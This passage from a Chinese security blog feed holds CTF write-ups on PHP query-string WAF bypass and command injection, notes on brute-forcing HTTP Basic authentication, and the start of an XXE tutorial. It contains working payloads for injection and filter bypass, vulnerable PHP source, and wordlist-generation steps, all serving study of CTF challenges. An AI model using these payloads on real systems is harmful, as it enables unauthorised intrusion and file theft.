class="number">8</span>,Ls))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 用python解决算法谜题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[RoarCTF 2019]Easy Calc</title>
      <link href="2021/02/10/RoarCTF-2019-Easy-Calc/"/>
      <url>2021/02/10/RoarCTF-2019-Easy-Calc/</url>
      
        <content type="html"><![CDATA[<p>这个题的考察的知识点是php字符串解析特性，或者http走私漏洞</p><span id="more"></span><h3 id="php字符串解析漏洞"><a href="#php字符串解析漏洞" class="headerlink" title="php字符串解析漏洞"></a>php字符串解析漏洞</h3><p>:label: php需要将所有参数转换为有效的变量名，在解析查询字符串时，会做两件事</p><blockquote><ol><li>删除空白符</li><li>将某些字符转换为下划线 (空格、[、]等)</li></ol></blockquote><h3 id="HTTP走私攻击"><a href="#HTTP走私攻击" class="headerlink" title="HTTP走私攻击"></a>HTTP走私攻击</h3><blockquote><p>http走私漏洞成因本质是前端服务器(CDN)和后端服务器接收数据的处理方式不同步</p></blockquote><p>类型如下：</p><ul><li>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。</li><li>TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。</li><li> TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</li></ul><p>详细参考：<a href="https://xz.aliyun.com/t/6654#toc-7">https://xz.aliyun.com/t/6654#toc-7</a></p><h3 id="0x01-分析题目"><a href="#0x01-分析题目" class="headerlink" title="0x01 分析题目"></a>0x01 分析题目</h3><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220125905.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220125905.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210220125905"></p><p>每次计算进行了一次对结果的get请求</p><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220323006.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220323006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210220323006"></p><p>burp抓包改包测试 得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>显然存在php代码执行漏洞 然而测试phpinfo()并不成功,应该存在waf</p><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220715107.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220715107.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210220715107"></p><h3 id="0x02-利用php字符串解析漏洞bypass-waf"><a href="#0x02-利用php字符串解析漏洞bypass-waf" class="headerlink" title="0x02 利用php字符串解析漏洞bypass waf"></a>0x02 利用php字符串解析漏洞bypass waf</h3><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220922578.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220922578.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210220922578"></p><p>查看php中禁掉的函数</p><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210221021847.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210221021847.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210221021847"></p><p>好家伙，我特么直接好家伙.jpg</p><p>还好 还有 file_get_content()、scandir() 并未过滤</p><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210221527194.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210221527194.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210221527194"></p><p>还有个黑名单，最终</p><blockquote><p>?%20num=1;var_dump(scandir(chr(47)))</p><p>?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p></blockquote><p>此外还可用</p><blockquote><p><strong>dechex() 函数</strong>：把十进制转换为十六进制。<br> <strong>hex2bin() 函数</strong>：把十六进制值的字符串转换为 ASCII 字符。<br> <strong>readfile() 函数</strong>：输出一个文件写入缓冲区。</p><p><strong>base_convert() 函数</strong>：在任意进制间转换数字</p></blockquote><h3 id="0x03利用http走私攻击完成绕过"><a href="#0x03利用http走私攻击完成绕过" class="headerlink" title="0x03利用http走私攻击完成绕过"></a>0x03利用http走私攻击完成绕过</h3><p>我们采用 cl-cl型绕过</p><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210224816896.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210224816896.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210224816896"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http走私攻击 </tag>
            
            <tag> php字符串解析漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于暴力破解和字典生成的一些操作</title>
      <link href="2021/02/09/%E5%85%B3%E4%BA%8E%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/"/>
      <url>2021/02/09/%E5%85%B3%E4%BA%8E%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>一些些关于爆破和制作字典的方法</p><span id="more"></span><h3 id="暴力破解basic认证-本质是在爆破用户名密码的base64编码"><a href="#暴力破解basic认证-本质是在爆破用户名密码的base64编码" class="headerlink" title="暴力破解basic认证(本质是在爆破用户名密码的base64编码)"></a>暴力破解basic认证(本质是在爆破用户名密码的base64编码)</h3><h4 id="HTTP-Basic-认证介绍"><a href="#HTTP-Basic-认证介绍" class="headerlink" title="HTTP Basic 认证介绍"></a>HTTP Basic 认证介绍</h4><p>基本认证 basic authentication 是 HTTP1.0 提出的认证方法</p><p>认证步骤：</p><ol><li><p>客户端访问一个受http基本认证保护的资源。</p></li><li><p>服务器返回401，要求客户端提供用户名和密码进行认证</p><p>401 Unauthorized</p><p>WWW-Authenticate: Basic realm=”WallyWorld”</p></li><li><p>客户端将输入的用户名密码用base64进行编码后，采用非加密的明文方式传送个服务器。</p><p>Authorization: Basic xxxxxxxx</p></li><li><p>如果认证成功，则返回相关的资源。如果认证失败，则返回401状态，要求重新认证</p></li></ol><h4 id="爆破方法"><a href="#爆破方法" class="headerlink" title="爆破方法"></a>爆破方法</h4><p> :label:利用burp的Intruder模块即可，爆破方案用Runtime即可</p><p><img src="/2021/02/09/%E5%85%B3%E4%BA%8E%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/image-20210209154758836.png" class="lazyload" data-srcset="/2021/02/09/%E5%85%B3%E4%BA%8E%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/image-20210209154758836.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210209154758836"></p><p>:label: 利用python代码生成一个符合basic模式的字典 :arrow_right:admin:password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rdfile</span>(<span class="params">one_file</span>):</span></span><br><span class="line">    cttlist=[]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(one_file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        cttlist=f.readlines()</span><br><span class="line">    <span class="keyword">return</span> cttlist</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">concet_two_list</span>(<span class="params">list1,list2</span>):</span></span><br><span class="line">    result_list=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">            result_list.append(i.strip()+<span class="string">&#x27;:&#x27;</span>+j)</span><br><span class="line">    <span class="keyword">return</span> result_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_into_file</span>(<span class="params">onelist</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.writelines(onelist)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    list1=rdfile(<span class="string">&#x27;./username.txt&#x27;</span>)</span><br><span class="line">    list2=rdfile(<span class="string">&#x27;./password.txt&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(list2)</span><br><span class="line">    list3=concet_two_list(list1,list2)</span><br><span class="line">    write_into_file(list3)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="利用工具自制字典"><a href="#利用工具自制字典" class="headerlink" title="利用工具自制字典"></a>利用工具自制字典</h3><h4 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a>cupp</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -i #根据姓名 生日 等信息生成字典</span><br><span class="line">python3 cupp.py -w #根据现有字典拓展字典</span><br><span class="line">python3 cupp.py -l #下载字典</span><br></pre></td></tr></table></figure><h4 id="pydictor"><a href="#pydictor" class="headerlink" title="pydictor"></a>pydictor</h4><p>:label: 一款非常强大的字典生成工具</p><p>具体使用见 readme</p><h4 id="dymerge"><a href="#dymerge" class="headerlink" title="dymerge"></a>dymerge</h4><p>:label: Dymerge 用来操作多个已获得的字典文件，重塑以及合并的工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Dymerge删除重复项</span><br><span class="line">python3 dymerge.py dic1.txt dic2.txt -u</span><br><span class="line">Dymerge 拆开字典</span><br><span class="line">python3 dymerge.py dic1.txt dic2.txt -r</span><br><span class="line">Dymerge 字母和数字排序</span><br><span class="line">python3 dymerge.py dic1.txt dict2.txt -s</span><br><span class="line">Dymerge 输出合并内容</span><br><span class="line">python3 dymerge.py dic1.txt dict2.txt -s -t -o /root/output.txt</span><br><span class="line">Dymerge 定义为压缩文件输出</span><br><span class="line">python3 dymerge.py dic1.txt dic2.txt -z /root/output.zip</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴破 </tag>
            
            <tag> 字典制作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GXYCTF2019]Ping Ping Ping</title>
      <link href="2021/02/06/GXYCTF2019-Ping-Ping-Ping/"/>
      <url>2021/02/06/GXYCTF2019-Ping-Ping-Ping/</url>
      
        <content type="html"><![CDATA[<p>一道非常经典的命令执行绕过题</p><span id="more"></span><h3 id="测试回显"><a href="#测试回显" class="headerlink" title="测试回显"></a>测试回显</h3><p><img src="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206005922078.png" class="lazyload" data-srcset="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206005922078.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210206005922078"></p><p>分号或者管道符拼接执行命令</p><blockquote><p><code>?ip=127.0.0.1|ls</code></p><p><code>?ip=127.0.0.1;ls</code></p></blockquote><p><img src="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206010234137.png" class="lazyload" data-srcset="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206010234137.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210206010234137"></p><p><code>?ip=127.0.0.1|cat index.php</code>尝试读一下源码</p><p><img src="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206010333734.png" class="lazyload" data-srcset="/2021/02/06/GXYCTF2019-Ping-Ping-Ping/image-20210206010333734.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210206010333734"></p><h4 id="bypass空格过滤"><a href="#bypass空格过滤" class="headerlink" title="bypass空格过滤"></a>bypass空格过滤</h4><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure></blockquote><p>测试只有 $IFS$1可以</p><p>读出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="bypass-bash"><a href="#bypass-bash" class="headerlink" title="bypass bash"></a>bypass bash</h4><p>我们可以通过 sh来执行想要的命令</p><h4 id="bypass-flag"><a href="#bypass-flag" class="headerlink" title="bypass flag"></a>bypass flag</h4><blockquote><p>统配符号绕过符号绕过 ? *</p><p>fla’’g</p><p>fla\g.php</p><p>a=g;fla$a 变量拼接</p><p>echo “Y2F0IGZsYWcucGhw”| base64 -d | bash 编码解码</p><p>内联执行 反引号内命令的输出作为输入执行 </p></blockquote><p>因为<code>if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))</code> 和上面过滤了通配符的原因</p><p>所以只能采取变量拼接和编码的方式</p><h4 id="bypass-cat"><a href="#bypass-cat" class="headerlink" title="bypass cat"></a>bypass cat</h4><blockquote><p>tac </p><p>ca\t</p><p>通配符 c?t</p><p>编码如上 </p></blockquote><h3 id="三种payload"><a href="#三种payload" class="headerlink" title="三种payload"></a>三种payload</h3><p>结合上述源代码和bypass技巧，得到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ip=17.0.0.1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246386.html#commentform">https://www.cnblogs.com/wangtanzhi/p/12246386.html#commentform</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析XXE漏洞攻防</title>
      <link href="2021/02/05/%E6%B5%85%E6%9E%90XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/"/>
      <url>2021/02/05/%E6%B5%85%E6%9E%90XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<p>系统学习了XXE漏洞的原理，以及XML语法 XXE漏洞利用代码的编写</p><span id="more"></span><h3 id="XML代码用途和语法"><a href="#XML代码用途和语法" class="headerlink" title="XML代码用途和语法"></a>XML代码用途和语法</h3><blockquote><p>XML被设计者用来传输和储存数据。XML文档形成了一种树状结构，它从”根部”开始，扩展到”枝叶”。XML允许创作这定义自己的标签和自己的文档结构</p></blockquote><h4 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h4><blockquote><ul><li>所以的XML元素都必须有一个关闭标签</li><li>XML标签对大小写敏感</li><li>XML必须正确嵌套</li><li>XML属性值必须加引号</li><li>实体引用</li><li>在XML中，空格会被保留</li></ul></blockquote><h4 id="XML-DTD介绍"><a href="#XML-DTD介绍" class="headerlink" title="XML DTD介绍"></a>XML DTD介绍</h4><blockquote><p>拥有正确语法的XML被称为”形式良好”的XML。通过DTD验证的XML是”合法”的XML。</p></blockquote><p>DTD本身相当于给出了一套格式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span>(<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> &lt;-- PCDATA 的意思是被解析的字符数据parsed character data，一种数据类型 --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>&lt; -- CDATA 的意思是字符数据，是不会被解析的文本 --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">message</span>&gt;</span>Don&#x27;t forget me this weekind!<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD可以位于XML源文件内部，也可以位于XML源文件的外部，即如下两种格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;filename.dtd&quot;&gt;</span><br><span class="line">&lt;!DOCTYPE root-element [element-declarations]&gt;</span><br></pre></td></tr></table></figure><h4 id="DTD-实体介绍"><a href="#DTD-实体介绍" class="headerlink" title="DTD 实体介绍"></a>DTD 实体介绍</h4><blockquote><p>实体是用于定义引用普通文本和特殊字符的快捷方式的变量</p></blockquote><ul><li>内部实体：<code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</code></li><li>外部实体：<code>&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;</code>&gt;</li></ul><h3 id="XXE注入漏洞原理"><a href="#XXE注入漏洞原理" 